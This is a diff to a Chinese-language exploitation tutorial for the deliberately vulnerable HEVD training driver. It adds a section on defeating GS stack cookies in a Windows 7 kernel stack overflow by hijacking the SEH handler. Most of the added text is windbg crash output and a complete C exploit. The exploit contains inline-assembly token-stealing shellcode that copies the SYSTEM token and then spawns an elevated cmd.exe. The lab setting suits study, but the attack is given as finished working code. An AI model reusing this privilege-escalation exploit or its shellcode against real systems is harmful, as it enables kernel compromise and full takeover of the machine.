@@ -1198,7 +1198,7 @@ int main() {
 
 ```
 
-# 内核栈溢出
+# 内核栈溢出（未开启GS）
 
 ## 漏洞驱动代码分析
 
@@ -1377,7 +1377,7 @@ WARNING: Frame IP not in any known module. Following frames may be wrong.
 
 ```
 1: kd> dd KernelBuffer+0x800
-916f3a88  00000000 00000001 00000000 00000而
+916f3a88  00000000 00000001 00000000 00000000
 916f3a98  916f3278 00000302 916f3bc0 a5e990d0
 916f3aa8  4e66d44e 00000000 916f3ad4 a5edd696 // 返回地址
 916f3ab8  0016f334 00000800 00000001 c0000001
@@ -1457,7 +1457,7 @@ int main() {
 		return false;
 	}
 	DWORD recvBuf;
-	CHAR shellcode[0x830];
+	CHAR shellcode[0x830]; // 这里并没有确保shellcode在可读可写可执行的页中
 	RtlFillMemory((PVOID)shellcode, sizeof(shellcode)-0x4, 0x41);
 	*(PDWORD)(shellcode + 0x82c) = (DWORD)&Shellcode;
 	// allocate memory in non_paged pool
@@ -1473,25 +1473,409 @@ int main() {
 }
 ```
 
+# 内核栈溢出（开启GS）
+
+## 漏洞驱动代码分析 ##
+
+和不开启GS的代码相同，只不过没有关闭GS的宏定义。
+
+## 利用思路
+
+GS实际上就是Canary，绕过GS的方法如下：
+
+>- 通过覆盖SEH链表来阻止系统接管异常处理
+>- 通过改写C++虚表指针来控制程序流程 # msvcrt采用进程堆以后失效
+>- 用一些未开启GS安全保护的函数进行溢出（关键字保护或小于四字节的缓冲区）
+
+这里学到了一个小tip
+
+可以用windbg查询驱动的ioctl派遣函数：
+
+```
+3: kd> !drvobj hevd 2
+Driver object (880cf808) is for:
+ \Driver\HEVD
+DriverEntry:   98b6f19c	HEVD!GsDriverEntry
+DriverStartIo: 00000000	
+DriverUnload:  98b69cf0	HEVD!DriverUnloadHandler
+AddDevice:     00000000	
+
+Dispatch routines:
+[00] IRP_MJ_CREATE                      98b69d80	HEVD!IrpCreateCloseHandler
+[01] IRP_MJ_CREATE_NAMED_PIPE           98b6a5f0	HEVD!IrpNotImplementedHandler
+[02] IRP_MJ_CLOSE                       98b69d80	HEVD!IrpCreateCloseHandler
+[03] IRP_MJ_READ                        98b6a5f0	HEVD!IrpNotImplementedHandler
+[04] IRP_MJ_WRITE                       98b6a5f0	HEVD!IrpNotImplementedHandler
+[05] IRP_MJ_QUERY_INFORMATION           98b6a5f0	HEVD!IrpNotImplementedHandler
+[06] IRP_MJ_SET_INFORMATION             98b6a5f0	HEVD!IrpNotImplementedHandler
+[07] IRP_MJ_QUERY_EA                    98b6a5f0	HEVD!IrpNotImplementedHandler
+[08] IRP_MJ_SET_EA                      98b6a5f0	HEVD!IrpNotImplementedHandler
+[09] IRP_MJ_FLUSH_BUFFERS               98b6a5f0	HEVD!IrpNotImplementedHandler
+[0a] IRP_MJ_QUERY_VOLUME_INFORMATION    98b6a5f0	HEVD!IrpNotImplementedHandler
+[0b] IRP_MJ_SET_VOLUME_INFORMATION      98b6a5f0	HEVD!IrpNotImplementedHandler
+[0c] IRP_MJ_DIRECTORY_CONTROL           98b6a5f0	HEVD!IrpNotImplementedHandler
+[0d] IRP_MJ_FILE_SYSTEM_CONTROL         98b6a5f0	HEVD!IrpNotImplementedHandler
+[0e] IRP_MJ_DEVICE_CONTROL              98b69df0	HEVD!IrpDeviceIoCtlHandler
+[0f] IRP_MJ_INTERNAL_DEVICE_CONTROL     98b6a5f0	HEVD!IrpNotImplementedHandler
+[10] IRP_MJ_SHUTDOWN                    98b6a5f0	HEVD!IrpNotImplementedHandler
+[11] IRP_MJ_LOCK_CONTROL                98b6a5f0	HEVD!IrpNotImplementedHandler
+[12] IRP_MJ_CLEANUP                     98b6a5f0	HEVD!IrpNotImplementedHandler
+[13] IRP_MJ_CREATE_MAILSLOT             98b6a5f0	HEVD!IrpNotImplementedHandler
+[14] IRP_MJ_QUERY_SECURITY              98b6a5f0	HEVD!IrpNotImplementedHandler
+[15] IRP_MJ_SET_SECURITY                98b6a5f0	HEVD!IrpNotImplementedHandler
+[16] IRP_MJ_POWER                       98b6a5f0	HEVD!IrpNotImplementedHandler
+[17] IRP_MJ_SYSTEM_CONTROL              98b6a5f0	HEVD!IrpNotImplementedHandler
+[18] IRP_MJ_DEVICE_CHANGE               98b6a5f0	HEVD!IrpNotImplementedHandler
+[19] IRP_MJ_QUERY_QUOTA                 98b6a5f0	HEVD!IrpNotImplementedHandler
+[1a] IRP_MJ_SET_QUOTA                   98b6a5f0	HEVD!IrpNotImplementedHandler
+[1b] IRP_MJ_PNP                         98b6a5f0	HEVD!IrpNotImplementedHandler
+
+```
+
+这里我们的利用思路如下：
+
+- 首先分配一块可读可写可执行的内存页来放置我们的shellcode（或者直接写到text段作为用户态函数也行）
+- 将shellcode拷贝到可执行的内存页中
+- 因为开启了GS，所以不能直接覆盖返回地址，我们选择覆盖栈帧中的SEH地址并且触发kernel中的异常，所以SEH会执行我们的payload。
+- 为此，我们创建一个文件映射对象（File Mapping Object）并且将它映射到利用进程的地址空间
+- 将我们的userbuffer放在文件映射对象的最后并且复写SEH指向shellcode。
+- 调用DeviceIoControl函数与设备交互，发送UserBuffer到内核空间的驱动，并且发送4个额外的字节超过文件映射对象/UserBuffer
+- 4个额外字节会在从userbuffer拷贝到内核态时导致异常，因为这4个字节处于未分配的内存中，并且将会造成访问违规。
+- The Access Violation将会触发SEH链。
+
+这里为了测试SEH的偏移，我们用`cyclic`模式串调试一下，
+
+```
+0: kd> !analyze -v
+*******************************************************************************
+*                                                                             *
+*                        Bugcheck Analysis                                    *
+*                                                                             *
+*******************************************************************************
+
+UNEXPECTED_KERNEL_MODE_TRAP (7f)
+This means a trap occurred in kernel mode, and it's a trap of a kind
+that the kernel isn't allowed to have/catch (bound trap) or that
+is always instant death (double fault).  The first number in the
+bugcheck params is the number of the trap (8 = double fault, etc)
+Consult an Intel x86 family manual to learn more about what these
+traps are. Here is a *portion* of those codes:
+If kv shows a taskGate
+        use .tss on the part before the colon, then kv.
+Else if kv shows a trapframe
+        use .trap on that value
+Else
+        .trap on the appropriate frame will show where the trap was taken
+        (on x86, this will be the ebp that goes with the procedure KiTrap)
+Endif
+kb will then show the corrected stack.
+Arguments:
+Arg1: 00000008, EXCEPTION_DOUBLE_FAULT
+Arg2: 801e6000
+Arg3: 00000000
+Arg4: 00000000
+
+Debugging Details:
+------------------
 
 
+DUMP_CLASS: 1
 
+DUMP_QUALIFIER: 0
 
+BUILD_VERSION_STRING:  7601.17514.x86fre.win7sp1_rtm.101119-1850
 
+DUMP_TYPE:  0
 
+BUGCHECK_P1: 8
 
+BUGCHECK_P2: ffffffff801e6000
 
+BUGCHECK_P3: 0
 
+BUGCHECK_P4: 0
 
+BUGCHECK_STR:  0x7f_8
 
+TSS:  00000028 -- (.tss 0x28)
+eax=83844000 ebx=00000000 ecx=83845150 edx=00000008 esi=00000000 edi=87f9bd48
+eip=83f1d4f8 esp=83844d04 ebp=838450b0 iopl=0         nv up ei ng nz ac po nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010292
+nt!KeBugCheck2+0x11:
+83f1d4f8 89442428        mov     dword ptr [esp+28h],eax ss:0010:83844d2c=????????
+Resetting default scope
 
+CPU_COUNT: 4
 
+CPU_MHZ: af8
 
+CPU_VENDOR:  GenuineIntel
 
+CPU_FAMILY: 6
 
+CPU_MODEL: 9e
 
+CPU_STEPPING: 9
 
+CPU_MICROCODE: 6,9e,9,0 (F,M,S,R)  SIG: 8E'00000000 (cache) 8E'00000000 (init)
 
+DEFAULT_BUCKET_ID:  WIN7_DRIVER_FAULT
+
+PROCESS_NAME:  StackBufferOverflow.exe
+
+CURRENT_IRQL:  2
+
+ANALYSIS_SESSION_HOST:  LAPTOP-TLRU764L
+
+ANALYSIS_SESSION_TIME:  05-21-2020 12:56:29.0237
+
+ANALYSIS_VERSION: 10.0.16299.15 amd64fre
+
+TRAP_FRAME:  83846944 -- (.trap 0xffffffff83846944)
+ErrCode = 00000010
+eax=00000000 ebx=00000000 ecx=66616168 edx=83eb6636 esi=00000000 edi=00000000
+eip=66616168 esp=838469b8 ebp=838469d8 iopl=0         nv up ei pl zr na pe nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
+66616168 ??              ???
+Resetting default scope
+
+EXCEPTION_RECORD:  83847040 -- (.exr 0xffffffff83847040)
+ExceptionAddress: 66616168 //崩溃时跳转到0x66616168处
+   ExceptionCode: c0000005 (Access violation)
+  ExceptionFlags: 00000010
+NumberParameters: 2
+   Parameter[0]: 00000008
+   Parameter[1]: 66616168
+Attempt to execute non-executable address 66616168
+
+```
+
+所以SEH的偏移为：
+
+```
+cyclic -c i386 -l 0x66616168
+528
+```
+
+## 完成exp
+
+这里也需要平衡堆栈，因为是通过SEH劫持控制流到shellcode，最好是直接返回到`HEVD!IrpDeviceIoCtlHandler`函数
+
+```
+1: kd> kp
+ # ChildEBP RetAddr  
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+00 8fb7f128 83e905f4 0xfa1075
+01 8fb7f14c 83ec43b5 nt!ExecuteHandler+0x24
+02 8fb7f1e0 83ecd05c nt!RtlDispatchException+0xb6
+03 8fb7f774 83e56dd6 nt!KiDispatchException+0x17c
+04 8fb7f7dc 83e56d8a nt!CommonDispatchException+0x4a
+05 8fb7f860 9a9daa0f nt!KiExceptionExit+0x192
+06 8fb7fab0 9a9da8b6 HEVD!TriggerBufferOverflowStackGS(void * UserBuffer = 0x000d0dec, unsigned long Size = 0x218)+0x13f [d:\windows_kernel\hacksysextremevulnerabledriver\driver\hevd\windows\bufferoverflowstackgs.c @ 107] 
+07 8fb7fad4 9a9daee5 HEVD!BufferOverflowStackGSIoctlHandler(struct _IRP * Irp = 0x88165dc8, struct _IO_STACK_LOCATION * IrpSp = 0x88165e38 IRP_MJ_DEVICE_CONTROL / 0x0 for Device for "\Driver\HEVD")+0x76 [d:\windows_kernel\hacksysextremevulnerabledriver\driver\hevd\windows\bufferoverflowstackgs.c @ 144] 
+08 8fb7fafc 83e4f593 HEVD!IrpDeviceIoCtlHandler(struct _DEVICE_OBJECT * DeviceObject = 0x884fc4c8 Device for "\Driver\HEVD", struct _IRP * Irp = 0x88165dc8)+0xf5 [d:\windows_kernel\hacksysextremevulnerabledriver\driver\hevd\windows\hacksysextremevulnerabledriver.c @ 281] 
+09 8fb7fb14 8404399f nt!IofCallDriver+0x63
+0a 8fb7fb34 84046b71 nt!IopSynchronousServiceTail+0x1f8
+0b 8fb7fbd0 8408d3f4 nt!IopXxxControlFile+0x6aa
+0c 8fb7fc04 83e561ea nt!NtDeviceIoControlFile+0x2a
+0d 8fb7fc04 775b70b4 nt!KiFastCallEntry+0x12a
+0e 0022f6d0 775b5864 ntdll!KiFastSystemCallRet
+0f 0022f6d4 7595989d ntdll!ZwDeviceIoControlFile+0xc
+10 0022f734 75afa671 KernelBase!DeviceIoControl+0xf6
+11 0022f760 00fa1149 kernel32!DeviceIoControlImplementation+0x80
+12 0022f798 00fa131a 0xfa1149
+13 0022f7e0 75b03c45 0xfa131a
+14 0022f7ec 775d37f5 kernel32!BaseThreadInitThunk+0xe
+15 0022f82c 775d37c8 ntdll!__RtlUserThreadStart+0x70
+16 0022f844 00000000 ntdll!_RtlUserThreadStart+0x1b
+1: kd> r
+eax=00000000 ebx=00000000 ecx=00fa1040 edx=83e90636 esi=00000000 edi=00000000
+eip=00fa1075 esp=8fb7f0fc ebp=8fb7f128 iopl=0         nv up ei pl zr na pe nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
+00fa1075 83c420          add     esp,20h
+1: kd> ? 8fb7fad4 - esp
+Evaluate expression: 2520 = 000009d8
+
+```
+
+所以`add esp 0x9d8`即可。但是还是会出现异常，看了一下，是由于需要将edi、esi、ebx三个寄存器的值予以恢复，如下，在`HEVD!TriggerBufferOverflowStackGS`返回前，pop了ecx、edi、esi、ebx四个寄存器，而ecx是存储cookie的。
+
+```
+8d85ea6d 59              pop     ecx
+8d85ea6e 5f              pop     edi
+8d85ea6f 5e              pop     esi
+8d85ea70 5b              pop     ebx
+8d85ea71 8b4de4          mov     ecx,dword ptr [ebp-1Ch]
+8d85ea74 33cd            xor     ecx,ebp
+8d85ea76 e8d5b5fbff      call    HEVD!__security_check_cookie (8d81a050)
+8d85ea7b 8be5            mov     esp,ebp
+8d85ea7d 5d              pop     ebp
+
+```
+
+堆栈情况如下：
+
+```
+1: kd> dd esp
+834ab878  883747e0 8816dda8 00000000 000000b0
+834ab888  00000001 00000000 00000000 61616161
+834ab898  00000000 00000000 00000000 00000000
+834ab8a8  00000000 00000000 00000000 00000000
+834ab8b8  00000000 00000000 00000000 00000000
+834ab8c8  00000000 00000000 00000000 00000000
+834ab8d8  00000000 00000000 00000000 00000000
+834ab8e8  00000000 00000000 00000000 00000000
+1: kd> kp
+ # ChildEBP RetAddr  
+00 834abab0 8d85e8b6 HEVD!TriggerBufferOverflowStackGS(void * UserBuffer = 0x01202190, unsigned long Size = 4)+0x19e 
+01 834abad4 8d85eee5 HEVD!BufferOverflowStackGSIoctlHandler(struct _IRP * Irp = 0x86ac9e78, struct _IO_STACK_LOCATION * IrpSp = 0x86ac9ee8 IRP_MJ_DEVICE_CONTROL / 0x0 for {...})+0x76 
+02 834abafc 83e82593 HEVD!IrpDeviceIoCtlHandler(struct _DEVICE_OBJECT * DeviceObject = 0x8816dda8 Device for "\Driver\HEVD", struct _IRP * Irp = 0x86ac9e78)+0xf5 
+03 834abb14 8407699f nt!IofCallDriver+0x63
+04 834abb34 84079b71 nt!IopSynchronousServiceTail+0x1f8
+
+```
+
+在我们的shellcode执行到返回前时，堆栈中某处的情况如下：
+
+```
+2: kd> dd 8345bafc - 284
+8345b878  87fd3e08 8816dda8 00000000 000000b0
+8345b888  00000001 00000000 00000000 00c71040
+8345b898  00c71040 00c71040 00c71040 00c71040
+8345b8a8  00c71040 00c71040 00000003 00000004
+8345b8b8  00c7107b 00000000 00c7107b 00000003
+8345b8c8  8345b9f0 83efff57 8345b9b4 83efff5f
+8345b8d8  b702a4a9 00c7107b 00000000 00c7107b
+8345b8e8  00c71040 00c71040 00c71040 00c71040
+
+```
+
+也就是
+
+```
+					 add esp, 0x9d8
+					 mov edi, [esp-0x284]
+					 mov esi, [esp-0x280]
+					 mov ebx, [esp-0x27c]
+					 pop ebp
+```
+
+因此完整的shellcode如下：
+
+```c
+#include<stdio.h>
+#include<windows.h>
+
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+
+#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
+#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)
+#define FILEMAP_SIZE 0x1000
+#define BUF_SIZE 532
+
+void ShellcodeGS()
+{
+	//__debugbreak();
+	_asm
+	{
+		pushad
+		mov eax, fs:[124h]
+		mov eax, [eax + 0x50]
+		mov ecx, eax
+		mov edx, 4
+
+		find_sys_pid :
+					 mov eax, [eax + 0xb8]
+					 sub eax, 0xb8
+					 cmp[eax + 0xb4], edx
+					 jnz find_sys_pid
+
+					 mov edx, [eax + 0xf8]
+					 mov[ecx + 0xf8], edx
+					 popad
+					 add esp, 0x9d8
+					 mov edi, [esp-0x25c]
+					 mov esi, [esp-0x258]
+					 mov ebx, [esp-0x254]
+					 pop ebp
+					 ret 8
+	}
+}
+static VOID CreateCmd()
+{
+	STARTUPINFO si = { sizeof(si) };
+	PROCESS_INFORMATION pi = { 0 };
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_SHOW;
+	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
+	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
+	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
+}
+
+int main() {
+	HANDLE hDevice = INVALID_HANDLE_VALUE;  // handle to the drive to be examined
+	LPCWSTR lpSharedMemoryMap = L"Local\\SharedMemoryMap";
+	LPVOID pBuf = NULL;
+	LPVOID lpOverflowBuffer;
+	//CHAR pattern[] = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaaf";
+	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
+		GENERIC_READ | GENERIC_WRITE,
+		NULL,
+		NULL,
+		OPEN_EXISTING,
+		NULL,
+		NULL);
+
+	if (hDevice == INVALID_HANDLE_VALUE) {
+		printf("cannot open i/o device");
+		return false;
+	}
+
+	HANDLE hMapFile = CreateFileMapping(
+		INVALID_HANDLE_VALUE,	// Use paging file
+		NULL,					// Default security
+		PAGE_EXECUTE_READWRITE, // RWX
+		0,						// 大端
+		FILEMAP_SIZE,			// 小端
+		lpSharedMemoryMap);
+	
+	if (hMapFile == NULL) {
+		printf("cannot open i/o device");
+	}
+
+	pBuf = MapViewOfFile(
+		hMapFile,
+		FILE_MAP_ALL_ACCESS,
+		0,
+		0,
+		FILEMAP_SIZE);
+
+	if (pBuf == NULL) {
+		CloseHandle(hMapFile);
+	}
+	//memcpy(pBuf, pattern, FILEMAP_SIZE);
+	memset(pBuf, 0x41, FILEMAP_SIZE);
+	lpOverflowBuffer = (LPVOID)((ULONG)pBuf + (FILEMAP_SIZE - BUF_SIZE));
+	
+	for (unsigned int i = 0; i < BUF_SIZE; i += 4) // Fill Buffer with Payload address to overwrite the SEH Handler
+		*(PDWORD)((ULONG)lpOverflowBuffer + i) = (DWORD)&ShellcodeGS;
+	
+	//memcpy(lpOverflowBuffer, pattern, sizeof(pattern));
+	DWORD recvBuf;
+	// allocate memory in non_paged pool
+	DeviceIoControl(hDevice,                       // device to be queried
+		HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS, // operation to perform
+		lpOverflowBuffer, BUF_SIZE + 4,
+		//"aaaa", 4,
+		//pBuf, FILEMAP_SIZE + 4,
+		NULL, 0,
+		&recvBuf,                         // # bytes returned
+		NULL);          // synchronous I/O
+	
+	CreateCmd();
+	return 0;
+}
+```
 
 
 
